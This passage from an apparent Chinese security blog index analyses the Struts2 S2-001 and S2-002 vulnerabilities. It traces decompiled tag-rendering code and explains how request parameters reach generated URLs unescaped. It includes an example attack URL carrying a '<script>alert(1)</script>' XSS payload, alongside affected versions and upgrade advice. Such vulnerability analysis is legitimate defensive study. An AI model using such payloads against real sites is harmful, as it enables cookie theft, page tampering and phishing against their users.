&#123;            this.addParameter(&quot;tabindex&quot;, this.findString(this.tabindex));        &#125;        if (this.onclick != null) &#123;            this.addParameter(&quot;onclick&quot;, this.findString(this.onclick));        &#125;        if (this.ondblclick != null) &#123;            this.addParameter(&quot;ondblclick&quot;, this.findString(this.ondblclick));        &#125;        if (this.onmousedown != null) &#123;            this.addParameter(&quot;onmousedown&quot;, this.findString(this.onmousedown));        &#125;        if (this.onmouseup != null) &#123;            this.addParameter(&quot;onmouseup&quot;, this.findString(this.onmouseup));        &#125;        if (this.onmouseover != null) &#123;            this.addParameter(&quot;onmouseover&quot;, this.findString(this.onmouseover));        &#125;        if (this.onmousemove != null) &#123;            this.addParameter(&quot;onmousemove&quot;, this.findString(this.onmousemove));        &#125;        if (this.onmouseout != null) &#123;            this.addParameter(&quot;onmouseout&quot;, this.findString(this.onmouseout));        &#125;        if (this.onfocus != null) &#123;            this.addParameter(&quot;onfocus&quot;, this.findString(this.onfocus));        &#125;        if (this.onblur != null) &#123;            this.addParameter(&quot;onblur&quot;, this.findString(this.onblur));        &#125;        if (this.onkeypress != null) &#123;            this.addParameter(&quot;onkeypress&quot;, this.findString(this.onkeypress));        &#125;        if (this.onkeydown != null) &#123;            this.addParameter(&quot;onkeydown&quot;, this.findString(this.onkeydown));        &#125;        if (this.onkeyup != null) &#123;            this.addParameter(&quot;onkeyup&quot;, this.findString(this.onkeyup));        &#125;        if (this.onselect != null) &#123;            this.addParameter(&quot;onselect&quot;, this.findString(this.onselect));        &#125;        if (this.onchange != null) &#123;            this.addParameter(&quot;onchange&quot;, this.findString(this.onchange));        &#125;        if (this.accesskey != null) &#123;            this.addParameter(&quot;accesskey&quot;, this.findString(this.accesskey));        &#125;        if (this.cssClass != null) &#123;            this.addParameter(&quot;cssClass&quot;, this.findString(this.cssClass));        &#125;        if (this.cssStyle != null) &#123;            this.addParameter(&quot;cssStyle&quot;, this.findString(this.cssStyle));        &#125;        if (this.title != null) &#123;            this.addParameter(&quot;title&quot;, this.findString(this.title));        &#125;        if (this.parameters.containsKey(&quot;value&quot;)) &#123;            this.parameters.put(&quot;nameValue&quot;, this.parameters.get(&quot;value&quot;));        &#125; else if (this.evaluateNameValue()) &#123;            Class valueClazz = this.getValueClassType();            if (valueClazz != null) &#123;                if (this.value != null) &#123;                    this.addParameter(&quot;nameValue&quot;, this.findValue(this.value, valueClazz));//用户输入或 OGNL 值                &#125; else if (name != null) &#123;                    String expr = name;                    if (this.altSyntax()) &#123;                        expr = &quot;%&#123;&quot; + name + &quot;&#125;&quot;;                    &#125;                    this.addParameter(&quot;nameValue&quot;, this.findValue(expr, valueClazz));                &#125;            &#125; else if (this.value != null) &#123;                this.addParameter(&quot;nameValue&quot;, this.findValue(this.value));            &#125; else if (name != null) &#123;                this.addParameter(&quot;nameValue&quot;, this.findValue(name));            &#125;        &#125;        Form form = (Form)this.findAncestor(Form.class);        this.populateComponentHtmlId(form);        if (form != null) &#123;            this.addParameter(&quot;form&quot;, form.getParameters());            if (name != null) &#123;                List tags = (List)form.getParameters().get(&quot;tagNames&quot;);                tags.add(name);            &#125;        &#125;        if (this.tooltipConfig != null) &#123;            this.addParameter(&quot;tooltipConfig&quot;, this.findValue(this.tooltipConfig));        &#125;        if (this.tooltip != null) &#123;            this.addParameter(&quot;tooltip&quot;, this.findString(this.tooltip));            Map tooltipConfigMap = this.getTooltipConfig(this);            if (form != null) &#123;                form.addParameter(&quot;hasTooltip&quot;, Boolean.TRUE);                Map overallTooltipConfigMap = this.getTooltipConfig(form);                overallTooltipConfigMap.putAll(tooltipConfigMap);                for(Map.Entry entry : overallTooltipConfigMap.entrySet()) &#123;                    this.addParameter((String)entry.getKey(), entry.getValue());                &#125;            &#125; else &#123;                LOG.warn(&quot;No ancestor Form found, javascript based tooltip will not work, however standard HTML tooltip using alt and title attribute will still work &quot;);            &#125;        &#125;        this.evaluateExtraParams();    &#125;\n\n分析 StrutsBodyTagSupport.class找到关键入口\n//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//package org.apache.struts2.views.jsp;import com.opensymphony.xwork2.util.ValueStack;import java.io.PrintWriter;import javax.servlet.jsp.tagext.BodyTagSupport;import org.apache.struts2.util.FastByteArrayOutputStream;import org.apache.struts2.views.annotations.StrutsTagAttribute;import org.apache.struts2.views.util.ContextUtil;public class StrutsBodyTagSupport extends BodyTagSupport &#123;    private static final long serialVersionUID = -1201668454354226175L;    @StrutsTagAttribute(        required = false,        description = &quot;The id of the tag element&quot;    )    public void setId(String string) &#123;        super.setId(string);    &#125;    protected boolean altSyntax() &#123;        return ContextUtil.isUseAltSyntax(this.getStack().getContext());    &#125;    protected ValueStack getStack() &#123;        return TagUtils.getStack(this.pageContext);    &#125;    protected String findString(String expr) &#123;        return (String)this.findValue(expr, String.class);    &#125;    \t/*检测是否开启了altStntax(),并检查是否以&#123;&#125;,如果为true,则取表达式内容的值，然后调用getStack().findValue(expr),解析该表达式*/    protected Object findValue(String expr) &#123;        if (this.altSyntax() &amp;&amp; expr.startsWith(&quot;%&#123;&quot;) &amp;&amp; expr.endsWith(&quot;&#125;&quot;)) &#123;            expr = expr.substring(2, expr.length() - 1);        &#125;        return this.getStack().findValue(expr);    &#125;\t/*如果开启了altSyntax()并且toType目标类型是String,则调用translateVariables(expr, this.getStack()),将字符串里的变量占位符替换成实际值，否则如果为&#123;&#125;包裹的表达式，调用getStack().findValue(expr, toType),让ValueStack用OGNL求值转换成指定类型*/    protected Object findValue(String expr, Class toType) &#123;        if (this.altSyntax() &amp;&amp; toType == String.class) &#123;            return translateVariables(expr, this.getStack());        &#125; else &#123;            if (this.altSyntax() &amp;&amp; expr.startsWith(&quot;%&#123;&quot;) &amp;&amp; expr.endsWith(&quot;&#125;&quot;)) &#123;                expr = expr.substring(2, expr.length() - 1);            &#125;            return this.getStack().findValue(expr, toType);        &#125;    &#125;    protected String toString(Throwable t) &#123;        FastByteArrayOutputStream bout = new FastByteArrayOutputStream();        PrintWriter wrt = new PrintWriter(bout);        t.printStackTrace(wrt);        wrt.close();        return bout.toString();    &#125;    protected String getBody() &#123;        return this.bodyContent == null ? &quot;&quot; : this.bodyContent.getString().trim();    &#125;\t/*循环解析%&#123;&#125;表达式，直到找不到%&#123;&#125;为止*/    public static String translateVariables(String expression, ValueStack stack) &#123;        /*这就是检测字符串里有没有 %&#123;&#125; 语法。*/        while(true) &#123;            int x = expression.indexOf(&quot;%&#123;&quot;);            int y = expression.indexOf(&quot;&#125;&quot;, x);            if (x == -1 || y == -1) &#123;                return expression;            &#125;            String var = expression.substring(x + 2, y);//截取表达式内容                        Object o = stack.findValue(var, String.class);//从ValueStack查找val值，无论原值是什么，都要转换成String类型            /*            如果 o 不为 null → 把 %&#123;var&#125; 替换成 o 的值。            如果 o 为 null → 直接删掉 %&#123;var&#125;。            */            if (o != null) &#123;                expression = expression.substring(0, x) + o + expression.substring(y + 1);            &#125; else &#123;                expression = expression.substring(0, x) + expression.substring(y + 1);            &#125;        &#125;    &#125;&#125;\n\n看看ValueStack\n//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//package com.opensymphony.xwork2.util;import java.util.Map;public interface ValueStack &#123;    String VALUE_STACK = &quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;;    String REPORT_ERRORS_ON_NO_PROP = &quot;com.opensymphony.xwork2.util.ValueStack.ReportErrorsOnNoProp&quot;;    Map getContext();    void setDefaultType(Class var1);    void setExprOverrides(Map var1);    Map getExprOverrides();    CompoundRoot getRoot();    void setValue(String var1, Object var2);    void setValue(String var1, Object var2, boolean var3);    String findString(String var1);\t//解析 OGNL 表达式，返回对应值。    Object findValue(String var1);\t//解析表达式并转换为指定类型。    Object findValue(String var1, Class var2);    Object peek();    Object pop();    void push(Object var1);\t//将值设置到值栈    void set(String var1, Object var2);    int size();&#125;\n\nJSP自定义标签生命周期\n\n\n阶段\n方法\n说明\n在 Struts2 中体现\n\n\n\n标签开始\ndoStartTag()\n创建组件对象（如 TextField），注入依赖，调用 populateParams() 设置参数\n由 TextFieldTag → AbstractUITag → ComponentTagSupport 实现\n\n\n标签体处理\ndoAfterBody()（可选）\n如果标签有 body 内容，会决定是否重复执行 body\n对 &lt;s:iterator&gt; 等有 body 的标签有用，&lt;s:textfield&gt; 没有 body\n\n\n标签结束\ndoEndTag()\n调用组件的 end() 方法，生成最终 HTML 代码（如 &lt;input type=&quot;text&quot;&gt;）\n由 UIBean → Component 处理\n\n\n释放资源\nrelease()\n重置标签对象的字段，便于 JSP 容器复用\nStruts2 标签会清理组件参数\n\n\n","categories":["Struts2"],"tags":["Struts2","s2-001"]},{"title":"Struts2-s2-002","url":"/2025/09/20/Struts2-s2-002/","content":"S2-002漏洞原理官方描述:\n&lt;s:url&gt; 和 &lt;s:a&gt; 标签在生成 URL 时，如果包含的参数值没有被正确转义，攻击者就可以注入恶意的客户端脚本代码。\n具体情况：\n\n&lt;s:a&gt; 标签中的参数值，如果包含未转义的双引号 &quot;, 可以破坏 HTML 属性，并插入恶意代码。\n&lt;s:url&gt; 和 &lt;s:a&gt; 标签在 includeParams 不为 &quot;none&quot; 时，无法正确转义 &lt;script&gt; 标签。\n例如攻击 URL：\n\n\n\nhttp://localhost/foo/bar.action?&lt;script&gt;alert(1)&lt;/script&gt;test=hello\n\n​\t\t这样会导致浏览器执行恶意脚本。\n就是XSS漏洞，影响组件即Strust2&lt;s:url&gt;和 &lt;s:a&gt; 标签，允许攻击者注入 任意 JavaScript 代码，可能窃取用户 Cookie、篡改页面、实施钓鱼攻击。\n漏洞影响版本Struts 2.0.0 到 2.1.8.1\n解决方案\n官方建议：立即升级 Struts2 至 2.2.1 或更高版本。\n\n原因：\n\n从 Struts 2.0.11.1 开始：\n&lt;s:a&gt; 标签会对双引号进行转义。\n&lt;s:a&gt; 和 &lt;s:url&gt; 标签会对 &lt;script&gt; 标签递归转义。\n\n\n但是后来发现 2.0.11.1 并不能完全修复问题，只有 2.2.1 及以上版本 才彻底解决\n\n\n\n复现测试\n漏洞分析&lt;s:url&gt; 和 &lt;s:a&gt; 标签在生成 URL 时，如果包含的参数值没有被正确转义，攻击者就可以注入恶意的客户端脚本代码。\n从分析标签入手即可，通过s2-001知道doStartTag在ComponetTagSupport.class：在这里打个断点分析\n\n//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//package org.apache.struts2.views.jsp;import com.opensymphony.xwork2.inject.Container;import com.opensymphony.xwork2.util.ValueStack;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.jsp.JspException;import org.apache.struts2.components.Component;import org.apache.struts2.dispatcher.Dispatcher;public abstract class ComponentTagSupport extends StrutsBodyTagSupport &#123;    protected Component component;    public abstract Component getBean(ValueStack var1, HttpServletRequest var2, HttpServletResponse var3);    public int doEndTag() throws JspException &#123;        this.component.end(this.pageContext.getOut(), this.getBody());        this.component = null;        return 6;    &#125;    public int doStartTag() throws JspException &#123;        this.component = this.getBean(this.getStack(), (HttpServletRequest)this.pageContext.getRequest(), (HttpServletResponse)this.pageContext.getResponse());        Container container = Dispatcher.getInstance().getContainer();        container.inject(this.component);                //populateParms读取标签的属性设置,如果 includeParams=&quot;get&quot; 或 &quot;all&quot;，它会从用户请求（URL 的 GET 参数或 POST 参数）中提取所有参数。        this.populateParams();        //this.component.start是开始生成HTML代码;this.pageContext.getOut是输出到页面。未在这里进行编码处理，漏洞点        boolean evalBody = this.component.start(this.pageContext.getOut());        /*        返回值决定后续行为：        2（EVAL_BODY_INCLUDE）：标签有内容（body），需要渲染它。        1（EVAL_BODY_BUFFERED）：标签有 body，但先存起来不立刻渲染。        0（SKIP_BODY）：没有 body，直接跳过。        */        if (evalBody) &#123;            return this.component.usesBody() ? 2 : 1;        &#125; else &#123;            return 0;        &#125;    &#125;    protected void populateParams() &#123;        this.component.setId(this.id);    &#125;    public Component getComponent() &#123;        return this.component;    &#125;&#125;\n\n\ndoStartTag是Strust2框架中自定义JSP(如(&lt;s:url&gt;或&lt;s:a&gt;))的一个核心方法，如&lt;a href=&quot;&lt;s:url action=&#39;hello_struts2&#39; includeParams=&#39;all&#39;/&gt;&quot;&gt;你好Struts2&lt;/a&gt;,Struts2 的 &lt;s:url&gt;或 &lt;s:a&gt;标签有个功能：可以自动把 URL 的参数（比如 ?name=xxx）加到生成的链接里（通过 includeParams=&quot;all&quot;），Struts2 会自动将当前 HTTP 请求中的 GET 和 POST 参数（例如 ?name=xxx）追加到生成的 URL 中\n\n继续跟进至URL.class\t\n//Start部分:调用发生在 doStartTag() 的 component.start(pageContext.getOut()) 阶段public boolean start(Writer writer) &#123;        boolean result = super.start(writer);//调用父类的start,实现初始化工作            if (this.value != null) &#123;            this.value = this.findString(this.value);//findString() 是 Struts2 的方法，用于解析 value 中的 OGNL 表达式（如果有），将其转换为实际字符串。        &#125;\t\t//决定是否包含请求参数。        try &#123;            String includeParams = this.urlIncludeParams != null ? this.urlIncludeParams.toLowerCase() : &quot;get&quot;;            if (this.includeParams != null) &#123;                includeParams = this.findString(this.includeParams);            &#125;\t\t\t//根据includeParams的值,决定如何处理请求参数合并到URL:&quot;none&quot;&quot;all&quot;&quot;get如果未设置则默认get&quot;            if (&quot;none&quot;.equalsIgnoreCase(includeParams)) &#123;                this.mergeRequestParameters(this.value, this.parameters, Collections.EMPTY_MAP);// mergeRequestParameters() 将空参数集（Collections.EMPTY_MAP）合并到 this.parameters（URL 组件的参数列表）            &#125; else if (&quot;all&quot;.equalsIgnoreCase(includeParams)) &#123;                this.mergeRequestParameters(this.value, this.parameters, this.req.getParameterMap());// 从HttpServletRequest获取所有参数                this.includeGetParameters();// 追加 GET 参数                this.includeExtraParameters();// 追加其他参数            &#125; else if (!&quot;get&quot;.equalsIgnoreCase(includeParams) &amp;&amp; (includeParams != null || this.value != null || this.action != null)) &#123;                if (includeParams != null) &#123;                    LOG.warn(&quot;Unknown value for includeParams parameter to URL tag: &quot; + includeParams);                &#125;            &#125; else &#123;                this.includeGetParameters();                this.includeExtraParameters(); // 追加手动指定的参数            &#125;            //处理异常        &#125; catch (Exception e) &#123;            LOG.warn(&quot;Unable to put request parameters (&quot; + this.req.getQueryString() + &quot;) into parameter map.&quot;, e);        &#125;        return result;    &#125;\n\n\n\n\n跟进mergeRequestParameters\nprotected void mergeRequestParameters(String value, Map parameters, Map contextParameters) &#123;\t    //contextParameters 通常是 req.getParameterMap() 的结果，包含用户请求中的所有参数。初始化为 contextParameters 的副本。       Map mergedParams = new LinkedHashMap(contextParameters);    //检查 &lt;s:url&gt; 的 value 属性（基础 URL）是否非空、去掉空格后有内容，并且包含查询字符串（?后的参数）。       if (value != null &amp;&amp; value.trim().length() &gt; 0 &amp;&amp; value.indexOf(&quot;?&quot;) &gt; 0) &#123;           new LinkedHashMap();           String queryString = value.substring(value.indexOf(&quot;?&quot;) + 1);           mergedParams = UrlHelper.parseQueryString(queryString);// 将查询字符串解析为键值对的 Map\t\t// 遍历 contextParameters（用户请求参数），将未出现在 mergedParams 中的键值对添加到 mergedParams。           for(Map.Entry entry : contextParameters.entrySet()) &#123;               Object key = entry.getKey();               if (!mergedParams.containsKey(key)) &#123;                   mergedParams.put(key, entry.getValue());               &#125;           &#125;       &#125;\t//将 mergedParams（合并后的参数集合）中的键值对进一步合并到 parameters（URL 组件的最终参数列表）       for(Map.Entry entry : mergedParams.entrySet()) &#123;           Object key = entry.getKey();           if (!parameters.containsKey(key)) &#123;               parameters.put(key, entry.getValue());           &#125;       &#125;   &#125;\n\n继续跟进\n// 将 HTTP 请求中的 GET 参数（URL 查询字符串，如 ?xss=&lt;script&gt;alert(1)&lt;/script&gt;）合并到 URL 组件的参数列表（this.parameters）。private void includeGetParameters() &#123;       /*    Dispatcher.getInstance().isPortletSupportActive()：检查 Struts2 是否启用了 Portlet 支持(Portlet 是 Java 的 Web 组件模型，类似 Servlet),\t下述    PortletActionContext.isPortletRequest()：检查当前请求是否为 Portlet 请求。    如果 不是 Portlet 环境（通常是普通 Web 应用），执行 GET 参数合并。    */    if (!Dispatcher.getInstance().isPortletSupportActive() || !PortletActionContext.isPortletRequest()) &#123;        String query = this.extractQueryString();            //UrlHelper.parseQueryString(query)：将查询字符串解析为 Map        this.mergeRequestParameters(this.value, this.parameters, UrlHelper.parseQueryString(query));        &#125;    &#125;\n\n继续跟进\n//将 ExtraParameterProvider 提供的额外参数合并到 URL 组件的参数列表（this.parameters）中。        private void includeExtraParameters() &#123;        if (this.extraParameterProvider != null) &#123;            this.mergeRequestParameters(this.value, this.parameters, this.extraParameterProvider.getExtraParameters());        &#125;    &#125;\n\n继续跟进\n//从 HTTP 请求（HttpServletRequest）中提取 URL 的查询字符串（即 ? 后面的部分，如 xss=abc&amp;age=25），并去除锚点（# 后面的部分）private String extractQueryString() &#123;        String query = this.req.getQueryString(); //req.getQueryString() 获取 URL 中 ? 后面的查询字符串（不包括 ? 本身）。        if (query == null) &#123;            query = (String)this.req.getAttribute(&quot;javax.servlet.forward.query_string&quot;);//原始请求的查询字符串        &#125;        if (query != null) &#123;            int idx = query.lastIndexOf(35);//35是#的ASCII 码            if (idx != -1) &#123;                query = query.substring(0, idx);            &#125;        &#125;        return query;    &#125;\n\n继续跟进\npublic Object getAttribute(String s) &#123;    if (s != null &amp;&amp; s.startsWith(&quot;javax.servlet&quot;)) &#123;        return super.getAttribute(s);    &#125; else &#123;        ActionContext ctx = ActionContext.getContext();// 获取当前上下文属性,包含请求、会话、值栈等请求        Object attribute = super.getAttribute(s);        // 检查是否已在递归调用        boolean alreadyIn = false;        Boolean b = (Boolean)ctx.get(&quot;__requestWrapper.getAttribute&quot;);        if (b != null) &#123;            alreadyIn = b;        &#125;        //从 ValueStack 查找属性        if (!alreadyIn &amp;&amp; attribute == null &amp;&amp; s.indexOf(&quot;#&quot;) == -1) &#123;            try &#123;                //设置递归标志,标记进入ValueStack查找。                ctx.put(&quot;__requestWrapper.getAttribute&quot;, Boolean.TRUE);                ValueStack stack = ctx.getValueStack();//获取值栈                if (stack != null) &#123;                    attribute = stack.findValue(s);                &#125;                //无论查找是否成功，恢复标志为 false，避免影响后续调用。            &#125; finally &#123;                ctx.put(&quot;__requestWrapper.getAttribute&quot;, Boolean.FALSE);            &#125;        &#125;        return attribute;    &#125;&#125;\n\n继续跟进至end标签\npublic boolean end(Writer writer, String body) &#123;        String scheme = this.req.getScheme(); // 获取URL协议        if (this.scheme != null) &#123;            scheme = this.scheme;        &#125;        String result;//根据value和action生成URL    \t/*    \t无value和有action    \t分为如果是Portlet请求和普通WEB环境    \t*/        if (this.value == null &amp;&amp; this.action != null) &#123;            if (Dispatcher.getInstance().isPortletSupportActive() &amp;&amp; PortletActionContext.isPortletRequest()) &#123;                result = PortletUrlHelper.buildUrl(this.action, this.namespace, this.parameters, this.portletUrlType, this.portletMode, this.windowState);            &#125; else &#123;                result = this.determineActionURL(this.action, this.namespace, this.method, this.req, this.res, this.parameters, scheme, this.includeContext, this.encode);            &#125;            // Portlet 环境的资源 URL 并且 value非空        &#125; else if (Dispatcher.getInstance().isPortletSupportActive() &amp;&amp; PortletActionContext.isPortletRequest()) &#123;            result = PortletUrlHelper.buildResourceUrl(this.value, this.parameters);            // 普通URL,非 Portlet 环境，或 value 非空        &#125; else &#123;            String _value = this.value;            if (_value != null &amp;&amp; _value.indexOf(&quot;?&quot;) &gt; 0) &#123;                _value = _value.substring(0, _value.indexOf(&quot;?&quot;));            &#125;            result = UrlHelper.buildUrl(_value, this.req, this.res, this.parameters, scheme, this.includeContext, this.encode);        &#125;    //添加&quot;#&quot;,如果 &lt;s:url&gt; 设置了 anchor 属性（&lt;s:url anchor=&quot;section&quot;&gt;），将锚点（如 #section）追加到 URL。        if (this.anchor != null &amp;&amp; this.anchor.length() &gt; 0) &#123;            result = result + &#x27;#&#x27; + this.anchor;        &#125;    //处理id        String id = this.getId();        if (id != null) &#123;            this.getStack().getContext().put(id, result);            this.req.setAttribute(id, result);        &#125; else &#123;            try &#123;                writer.write(result);            &#125; catch (IOException e) &#123;                throw new StrutsException(&quot;IOError: &quot; + e.getMessage(), e);            &#125;        &#125;        return super.end(writer, body);    &#125;\n\n继续\n//determineActionURL 将 Action 相关信息（action、namespace、method）映射为 URI。/*方法接收多个参数，用于构造 Struts2 Action 的 URL：action：&lt;s:url&gt; 的 action 属性（如 hello_struts2）。namespace：Action 的命名空间（如 /myApp）。method：Action 的方法名（如 execute）。req：HttpServletRequest，提供请求信息。res：HttpServletResponse，用于编码响应。parameters：参数集合（Map），包含请求参数（如 &#123;xss: &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&#125;）。scheme：协议（如 http 或 https）。includeContext：是否包含 Web 应用上下文路径（如 /myApp）。encodeResult：是否对 URL 进行编码（布尔值）。返回 String，表示生成的 URL。*/protected String determineActionURL(String action, String namespace, String method, HttpServletRequest req, HttpServletResponse res, Map parameters, String scheme, boolean includeContext, boolean encodeResult) &#123;        String finalAction = this.findString(action);        String finalNamespace = this.determineNamespace(namespace, this.getStack(), req);    /*创建一个 ActionMapping 对象，封装 Action 的信息    finalAction：Action 名称    finalNamespace：命名空间    method：Action 的方法    parameters：参数集合ActionMapping 是 Struts2 的核心对象，用于描述 Action 的路由信息。    */        ActionMapping mapping = new ActionMapping(finalAction, finalNamespace, method, parameters);        String uri = this.actionMapper.getUriFromActionMapping(mapping);        return UrlHelper.buildUrl(uri, req, res, parameters, scheme, includeContext, encodeResult);    &#125;\n\n跟进至findValue\nprotected Object findValue(String expr, Class toType) &#123;    //处理 Struts2 变量表达式    if (this.altSyntax() &amp;&amp; toType == String.class) &#123;        return TextParseUtil.translateVariables(&#x27;%&#x27;, expr, this.stack);//解析 %&#123;#var&#125; 格式的变量，从 ValueStack 中查找对应值。    //处理 OGNL 表达式    &#125; else &#123;        if (this.altSyntax() &amp;&amp; expr.startsWith(&quot;%&#123;&quot;) &amp;&amp; expr.endsWith(&quot;&#125;&quot;)) &#123;            expr = expr.substring(2, expr.length() - 1);        &#125;        return this.getStack().findValue(expr, toType);    &#125;&#125;\n\n继续跟进主要进行字符串的复制和追加，服务于 Struts2 的 URL 生成，生成路径，根据 action、request、response、参数、scheme 等信息，拼接生成最终的 URL。等\n然后就是doEndTag\npublic int doEndTag() throws JspException &#123;    this.component.end(this.pageContext.getOut(), this.getBody());    this.component = null;    return 6;&#125;\n\n\n\nPortlet 是什么？Portlet 提供了一种 组件化的门户解决方案：\n页面由多个 Portlet 拼接组成，每个 Portlet 有自己的请求、渲染、动作。\n所以 Portlet URL、windowState、portletMode 等属性会被特殊处理。\n","categories":["Struts2"],"tags":["Struts2","s2-001"]}]